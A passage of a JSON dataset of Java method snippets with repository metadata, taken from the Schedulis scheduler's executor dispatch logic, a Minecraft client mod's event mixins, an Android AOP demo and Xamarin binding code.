(!this.shutdown) {\n        synchronized (this) {\n          try {\n            // start processing queue if active, other wait for sometime\n            if (this.isActive) {\n              processQueuedFlows(this.activeExecutorRefreshWindowInMillisec,\n                  this.activeExecutorRefreshWindowInFlows);\n            }\n            wait(QUEUE_PROCESSOR_WAIT_IN_MS);\n          } catch (final Exception e) {\n            ExecutorManager.logger.error(\n                \"QueueProcessorThread Interrupted. Probably to shut down.\", e);\n          }\n        }\n      }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 34495, "method_name": "processQueuedFlows", "class_name": "QueueProcessorThread", "params": ["long", "int"], "throws": ["InterruptedException", "ExecutorManagerException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void processQueuedFlows(final long activeExecutorsRefreshWindow,\n        final int maxContinuousFlowProcessed) throws InterruptedException,\n        ExecutorManagerException {\n      long lastExecutorRefreshTime = 0;\n      int currentContinuousFlowProcessed = 0;\n\n      while (isActive() && (ExecutorManager.this.runningCandidate = ExecutorManager.this.queuedFlows\n          .fetchHead()) != null) {\n        final ExecutionReference reference = ExecutorManager.this.runningCandidate.getFirst();\n        final ExecutableFlow exflow = ExecutorManager.this.runningCandidate.getSecond();\n        final long currentTime = System.currentTimeMillis();\n\n        // if we have dispatched more than maxContinuousFlowProcessed or\n        // It has been more then activeExecutorsRefreshWindow millisec since we\n        // refreshed\n\n        if (currentTime - lastExecutorRefreshTime > activeExecutorsRefreshWindow\n            || currentContinuousFlowProcessed >= maxContinuousFlowProcessed) {\n          // Refresh executorInfo for all activeExecutors\n          refreshExecutors();\n          lastExecutorRefreshTime = currentTime;\n          currentContinuousFlowProcessed = 0;\n        }\n\n        /**\n         * <pre>\n         *  TODO: Work around till we improve Filters to have a notion of GlobalSystemState.\n         *        Currently we try each queued flow once to infer a global busy state\n         * Possible improvements:-\n         *   1. Move system level filters in refreshExecutors and sleep if we have all executors busy after refresh\n         *   2. Implement GlobalSystemState in selector or in a third place to manage system filters. Basically\n         *      taking out all the filters which do not depend on the flow but are still being part of Selector.\n         * Assumptions:-\n         *   1. no one else except QueueProcessor is updating ExecutableFlow update time\n         *   2. re-attempting a flow (which has been tried before) is considered as all executors are busy\n         * </pre>\n         */\n        if (exflow.getUpdateTime() > lastExecutorRefreshTime) {\n          // put back in the queue\n          ExecutorManager.this.queuedFlows.enqueue(exflow, reference);\n          ExecutorManager.this.runningCandidate = null;\n          final long sleepInterval =\n              activeExecutorsRefreshWindow\n                  - (currentTime - lastExecutorRefreshTime);\n          // wait till next executor refresh\n          Thread.sleep(sleepInterval);\n        } else {\n          exflow.setUpdateTime(currentTime);\n          // process flow with current snapshot of activeExecutors\n          selectExecutorAndDispatchFlow(reference, exflow);\n          ExecutorManager.this.runningCandidate = null;\n        }\n\n        // do not count failed flow processsing (flows still in queue)\n        if (ExecutorManager.this.queuedFlows.getFlow(exflow.getExecutionId()) == null) {\n          currentContinuousFlowProcessed++;\n        }\n      }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 34496, "method_name": "selectExecutorAndDispatchFlow", "class_name": "QueueProcessorThread", "params": ["ExecutionReference", "ExecutableFlow"], "throws": ["ExecutorManagerException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void selectExecutorAndDispatchFlow(final ExecutionReference reference,\n        final ExecutableFlow exflow)\n        throws ExecutorManagerException {\n      // FIXME Multi-tenant function to obtain the optimal executable executor from the executors that can be used by the job stream.\n      final Set<Executor> flowExecutors = ExecutorManager.this.activeExecutors.getAll().stream().filter(executor -> exflow.getExecutorIds().contains(executor.getId())).collect(Collectors.toSet());\n      final Set<Executor> remainingExecutors = new HashSet<>(flowExecutors);\n      ExecutorManager.logger.info(\"execId: \" + exflow.getExecutionId() + \", executors: \" + remainingExecutors.toString());\n      Throwable lastError;\n      synchronized (exflow) {\n        do {\n          final Executor selectedExecutor = selectExecutor(exflow, remainingExecutors);\n          if (selectedExecutor == null) {\n            ExecutorManager.this.commonMetrics.markDispatchFail();\n            handleNoExecutorSelectedCase(reference, exflow);\n            // RE-QUEUED - exit\n            return;\n          } else {\n            try {\n              dispatch(reference, exflow, selectedExecutor);\n              ExecutorManager.this.commonMetrics.markDispatchSuccess();\n              // SUCCESS - exit\n              return;\n            } catch (final ExecutorManagerException e) {\n              lastError = e;\n              logFailedDispatchAttempt(reference, exflow, selectedExecutor, e);\n              ExecutorManager.this.commonMetrics.markDispatchFail();\n              reference.setNumErrors(reference.getNumErrors() + 1);\n              // FAILED ATTEMPT - try other executors except selectedExecutor\n              updateRemainingExecutorsAndSleep(remainingExecutors, selectedExecutor, flowExecutors);\n            }\n          }\n        } while (reference.getNumErrors() < this.maxDispatchingErrors);\n        // GAVE UP DISPATCHING\n        final String message = \"Failed to dispatch queued execution \" + exflow.getId() + \" because \"\n            + \"reached \" + ConfigurationKeys.MAX_DISPATCHING_ERRORS_PERMITTED\n            + \" (tried \" + reference.getNumErrors() + \" executors)\";\n        ExecutorManager.logger.error(message);\n        ExecutorManager.this.executionFinalizer.finalizeFlow(exflow, message, lastError);  // \u901a\u7528\u544a\u8b66\n      }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 34497, "method_name": "updateRemainingExecutorsAndSleep", "class_name": "QueueProcessorThread", "params": ["Set<Executor>", "Executor", "Set<Executor>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void updateRemainingExecutorsAndSleep(final Set<Executor> remainingExecutors,\n        final Executor selectedExecutor, final Set<Executor> flowExecutors) {\n      remainingExecutors.remove(selectedExecutor);\n      if (remainingExecutors.isEmpty()) {\n        remainingExecutors.addAll(flowExecutors);\n        sleepAfterDispatchFailure();\n      }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 34498, "method_name": "sleepAfterDispatchFailure", "class_name": "QueueProcessorThread", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void sleepAfterDispatchFailure() {\n      try {\n        Thread.sleep(this.sleepAfterDispatchFailure.toMillis());\n      } catch (final InterruptedException e1) {\n        ExecutorManager.logger.warn(\"Sleep after dispatch failure was interrupted - ignoring\");\n      }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 34499, "method_name": "logFailedDispatchAttempt", "class_name": "QueueProcessorThread", "params": ["ExecutionReference", "ExecutableFlow", "Executor", "ExecutorManagerException"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void logFailedDispatchAttempt(final ExecutionReference reference,\n        final ExecutableFlow exflow,\n        final Executor selectedExecutor, final ExecutorManagerException e) {\n      ExecutorManager.logger.warn(String.format(\n          \"Executor %s responded with exception for exec: %d\",\n          selectedExecutor, exflow.getExecutionId()), e);\n      ExecutorManager.logger.info(String.format(\n          \"Failed dispatch attempt for exec %d with error count %d\",\n          exflow.getExecutionId(), reference.getNumErrors()));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 34500, "method_name": "getUserSpecifiedExecutor", "class_name": "QueueProcessorThread", "params": ["ExecutionOptions", "int"], "throws": null, "modifiers": ["private"], "return_type": "Executor", "snippet": "    private Executor getUserSpecifiedExecutor(final ExecutionOptions options,\n        final int executionId) {\n      Executor executor = null;\n      if (options != null\n          && options.getFlowParameters() != null\n          && options.getFlowParameters().containsKey(ExecutionOptions.USE_EXECUTOR)\n          && IS_NUMBER.matcher(options.getFlowParameters().get(ExecutionOptions.USE_EXECUTOR)).matches()) {\n        try {\n          final int executorId =\n              Integer.valueOf(options.getFlowParameters().get(\n                  ExecutionOptions.USE_EXECUTOR));\n          executor = fetchExecutor(executorId);\n\n          if (executor == null) {\n            ExecutorManager.logger\n                .warn(String\n                    .format(\n                        \"User specified executor id: %d for execution id: %d is not active, Looking up db.\",\n                        executorId, executionId));\n            executor = ExecutorManager.this.executorLoader.fetchExecutor(executorId);\n            if (executor == null) {\n              ExecutorManager.logger\n                  .warn(String\n                      .format(\n                          \"User specified executor id: %d for execution id: %d is missing from db. Defaulting to availableExecutors\",\n                          executorId, executionId));\n            }\n          }\n        } catch (final ExecutorManagerException ex) {\n          ExecutorManager.logger.error(\"Failed to fetch user specified executor for exec_id = \"\n              + executionId, ex);\n        }\n      }\n      return executor;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 34501, "method_name": "selectExecutor", "class_name": "QueueProcessorThread", "params": ["ExecutableFlow", "Set<Executor>"], "throws": null, "modifiers": ["private"], "return_type": "Executor", "snippet": "    private Executor selectExecutor(final ExecutableFlow exflow,\n        final Set<Executor> availableExecutors) {\n      Executor choosenExecutor =\n          getUserSpecifiedExecutor(exflow.getExecutionOptions(),\n              exflow.getExecutionId());\n\n      // If no executor was specified by admin\n      if (choosenExecutor == null) {\n        final ExecutorSelector selector = new ExecutorSelector(ExecutorManager.this.filterList,\n            ExecutorManager.this.comparatorWeightsMap);\n        choosenExecutor = selector.getBest(availableExecutors, exflow);\n        ExecutorManager.logger.info(\"Using dispatcher for execution id :\"\n                + exflow.getExecutionId() + \", use executor: \" + choosenExecutor);\n      }\n      return choosenExecutor;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 34502, "method_name": "handleNoExecutorSelectedCase", "class_name": "QueueProcessorThread", "params": ["ExecutionReference", "ExecutableFlow"], "throws": ["ExecutorManagerException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleNoExecutorSelectedCase(final ExecutionReference reference,\n        final ExecutableFlow exflow) throws ExecutorManagerException {\n      ExecutorManager.logger\n          .info(String\n              .format(\n                  \"Reached handleNoExecutorSelectedCase stage for exec %d with error count %d\",\n                  exflow.getExecutionId(), reference.getNumErrors()));\n      // TODO: handle scenario where a high priority flow failing to get\n      // schedule can starve all others\n      ExecutorManager.this.queuedFlows.enqueue(exflow, reference);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 34503, "method_name": "getType", "class_name": "PushEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Type", "snippet": "    public Type getType() {\n        return this.type;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/events/PushEvent.java", "stars": "12", "class_props": {"extends": "Event", "implements": null, "modifiers": ["public"]}}, {"id": 34504, "method_name": "methodPointCut", "class_name": "ToastAspect", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void methodPointCut() {\n\n    }", "url": "https://raw.githubusercontent.com/he303954106/AOP_Demo/master/app/src/main/java/com/netease/aop/login/aspect/ToastAspect.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34505, "method_name": "jointPoint", "class_name": "ToastAspect", "params": ["ProceedingJoinPoint"], "throws": ["Throwable"], "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object jointPoint(ProceedingJoinPoint joinPoint) throws Throwable {\n        Log.e(TAG, \"Toast Method Start >>> \");\n        Object[] args = joinPoint.getArgs();\n        args[0] = MyApplication.getApplication();\n        Object result = joinPoint.proceed(args);\n        Log.e(TAG, \"Toast Method End >>> \" + args[1]);\n        return result;\n    }", "url": "https://raw.githubusercontent.com/he303954106/AOP_Demo/master/app/src/main/java/com/netease/aop/login/aspect/ToastAspect.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34506, "method_name": "onActiveChanged", "class_name": "MediaSessionCompat_OnActiveChangeListenerImplementor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onActiveChanged ()\n\t{\n\t\tn_onActiveChanged ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/media/session/MediaSessionCompat_OnActiveChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 34507, "method_name": "n_onActiveChanged", "class_name": "MediaSessionCompat_OnActiveChangeListenerImplementor", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onActiveChanged ();\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/media/session/MediaSessionCompat_OnActiveChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 34508, "method_name": "monodroidAddReference", "class_name": "MediaSessionCompat_OnActiveChangeListenerImplementor", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/media/session/MediaSessionCompat_OnActiveChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 34509, "method_name": "monodroidClearReferences", "class_name": "MediaSessionCompat_OnActiveChangeListenerImplementor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v4/media/session/MediaSessionCompat_OnActiveChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 34510, "method_name": "isSneaking", "class_name": "MixinEntityPlayerSP", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "boolean", "snippet": "    public abstract boolean isSneaking();\n\n    @Shadow\n    protected abstract boolean isCurrentViewEntity();\n\n    private Location location;\n    private Rotation rotation;\n\n\n    @Override\n    public void move(MoverType type, double x, double y, double z) {\n        MotionEvent event = new MotionEvent(x, y, z);\n        Mercury.INSTANCE.getEventManager().fireEvent(event);\n        super.move(type, event.getX(), event.getY(), event.getZ());\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityPlayerSP.java", "stars": "12", "class_props": {"extends": "AbstractClientPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34511, "method_name": "isCurrentViewEntity", "class_name": "MixinEntityPlayerSP", "params": [], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "boolean", "snippet": "    protected abstract boolean isCurrentViewEntity();\n\n    private Location location;\n    private Rotation rotation;\n\n\n    @Override\n    public void move(MoverType type, double x, double y, double z) {\n        MotionEvent event = new MotionEvent(x, y, z);\n        Mercury.INSTANCE.getEventManager().fireEvent(event);\n        super.move(type, event.getX(), event.getY(), event.getZ());\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityPlayerSP.java", "stars": "12", "class_props": {"extends": "AbstractClientPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34512, "method_name": "move", "class_name": "MixinEntityPlayerSP", "params": ["MoverType", "double", "double", "double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void move(MoverType type, double x, double y, double z) {\n        MotionEvent event = new MotionEvent(x, y, z);\n        Mercury.INSTANCE.getEventManager().fireEvent(event);\n        super.move(type, event.getX(), event.getY(), event.getZ());\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityPlayerSP.java", "stars": "12", "class_props": {"extends": "AbstractClientPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34513, "method_name": "onPushOutOfBlocks", "class_name": "MixinEntityPlayerSP", "params": ["double", "double", "double", "CallbackInfoReturnable<Boolean>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onPushOutOfBlocks(double x, double y, double z, CallbackInfoReturnable<Boolean> cir) {\n        PushEvent event = new PushEvent(PushEvent.Type.BLOCK);\n        Mercury.INSTANCE.getEventManager().fireEvent(event);\n        if (event.isCancelled()) {\n            cir.setReturnValue(false);\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityPlayerSP.java", "stars": "12", "class_props": {"extends": "AbstractClientPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34514, "method_name": "onStartUpdateWalkingPlayer", "class_name": "MixinEntityPlayerSP", "params": ["CallbackInfo"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStartUpdateWalkingPlayer(CallbackInfo ci){\n        final UpdateEvent event = new UpdateEvent(EventTiming.PRE, getLocation(), getRotation());\n        Mercury.INSTANCE.getEventManager().fireEvent(event);\n        if (event.isCancelled()) {\n            ci.cancel();\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityPlayerSP.java", "stars": "12", "class_props": {"extends": "AbstractClientPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34515, "method_name": "onEndUpdateWalkingPlayer", "class_name": "MixinEntityPlayerSP", "params": ["CallbackInfo"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onEndUpdateWalkingPlayer(CallbackInfo ci){\n        Mercury.INSTANCE.getEventManager().fireEvent(new UpdateEvent(EventTiming.POST, getLocation(), getRotation()));\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityPlayerSP.java", "stars": "12", "class_props": {"extends": "AbstractClientPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34516, "method_name": "onUpdateWalkingPlayerPosX", "class_name": "MixinEntityPlayerSP", "params": ["EntityPlayerSP"], "throws": null, "modifiers": ["private"], "return_type": "double", "snippet": "    private double onUpdateWalkingPlayerPosX(EntityPlayerSP player) {\n        return location.getX();\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityPlayerSP.java", "stars": "12", "class_props": {"extends": "AbstractClientPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34517, "method_name": "onUpdateWalkingPlayerMinY", "class_name": "MixinEntityPlayerSP", "params": ["AxisAlignedBB"], "throws": null, "modifiers": ["private"], "return_type": "double", "snippet": "    private double onUpdateWalkingPlayerMinY(AxisAlignedBB boundingBox) {\n        return location.getY();\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityPlayerSP.java", "stars": "12", "class_props": {"extends": "AbstractClientPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34518, "method_name": "onUpdateWalkingPlayerPosZ", "class_name": "MixinEntityPlayerSP", "params": ["EntityPlayerSP"], "throws": null, "modifiers": ["private"], "return_type": "double", "snippet": "    private double onUpdateWalkingPlayerPosZ(EntityPlayerSP player) {\n        return location.getZ();\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityPlayerSP.java", "stars": "12", "class_props": {"extends": "AbstractClientPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34519, "method_name": "onUpdateWalkingPlayerOnGround", "class_name": "MixinEntityPlayerSP", "params": ["EntityPlayerSP"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean onUpdateWalkingPlayerOnGround(EntityPlayerSP player) {\n        return location.isOnGround();\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityPlayerSP.java", "stars": "12", "class_props": {"extends": "AbstractClientPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34520, "method_name": "onUpdateWalkingPlayerRotationYaw", "class_name": "MixinEntityPlayerSP", "params": ["EntityPlayerSP"], "throws": null, "modifiers": ["private"], "return_type": "float", "snippet": "    private float onUpdateWalkingPlayerRotationYaw(EntityPlayerSP player) {\n        return rotation.getYaw();\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityPlayerSP.java", "stars": "12", "class_props": {"extends": "AbstractClientPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34521, "method_name": "onUpdateWalkingPlayerRotationPitch", "class_name": "MixinEntityPlayerSP", "params": ["EntityPlayerSP"], "throws": null, "modifiers": ["private"], "return_type": "float", "snippet": "    private float onUpdateWalkingPlayerRotationPitch(EntityPlayerSP player) {\n        return rotation.getPitch();\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityPlayerSP.java", "stars": "12", "class_props": {"extends": "AbstractClientPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34522, "method_name": "getLocation", "class_name": "MixinEntityPlayerSP", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Location", "snippet": "    public Location getLocation() {\n        if (location == null)\n            location = new Location(mc.player.posX, mc.player.posY, mc.player.posZ, mc.player.onGround);\n        location.setX(mc.player.posX);\n        location.setY(mc.player.posY);\n        location.setZ(mc.player.posZ);\n        location.setOnGround(mc.player.onGround);\n        return location;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityPlayerSP.java", "stars": "12", "class_props": {"extends": "AbstractClientPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34523, "method_name": "getRotation", "class_name": "MixinEntityPlayerSP", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Rotation", "snippet": "    public Rotation getRotation() {\n        if (rotation == null)\n            rotation = new Rotation(mc.player.rotationYaw, mc.player.rotationPitch);\n        rotation.setYaw(mc.player.rotationYaw);\n        rotation.setPitch(mc.player.rotationPitch);\n        return rotation;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinEntityPlayerSP.java", "stars": "12", "class_props": {"extends": "AbstractClientPlayer", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34524, "method_name": "getName", "class_name": "JobDagNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getName() {\n    return name;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34525, "method_name": "setName", "class_name": "JobDagNode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setName(String name) {\n    this.name = name;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34526, "method_name": "getLevel", "class_name": "JobDagNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getLevel() {\n    return level;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34527, "method_name": "setLevel", "class_name": "JobDagNode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setLevel(int level) {\n    this.level = level;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34528, "method_name": "addParent", "class_name": "JobDagNode", "params": ["JobDagNode"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void addParent(JobDagNode parent) {\n    parents.add(parent.getName());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34529, "method_name": "setParents", "class_name": "JobDagNode", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setParents(List<String> parents) {\n    this.parents = parents;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34530, "method_name": "getParents", "class_name": "JobDagNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "  public List<String> getParents() {\n    return parents;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34531, "method_name": "addSuccessor", "class_name": "JobDagNode", "params": ["JobDagNode"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void addSuccessor(JobDagNode successor) {\n    successors.add(successor.getName());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34532, "method_name": "setSuccessors", "class_name": "JobDagNode", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setSuccessors(List<String> successors) {\n    this.successors = successors;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34533, "method_name": "getSuccessors", "class_name": "JobDagNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "  public List<String> getSuccessors() {\n    return successors;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34534, "method_name": "setMapReduceJobState", "class_name": "JobDagNode", "params": ["MapReduceJobState"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setMapReduceJobState(MapReduceJobState mapReduceJobState) {\n    this.mapReduceJobState = mapReduceJobState;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34535, "method_name": "getMapReduceJobState", "class_name": "JobDagNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MapReduceJobState", "snippet": "  public MapReduceJobState getMapReduceJobState() {\n    return mapReduceJobState;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/JobDagNode.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34536, "method_name": "setJobConfiguration", "class_name": "JobDagNode", "params": ["Properties"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setJobConfiguration(Properties jobConfiguration) {\n    this.jobConfiguration = jobConfiguration;\n  }", "url": 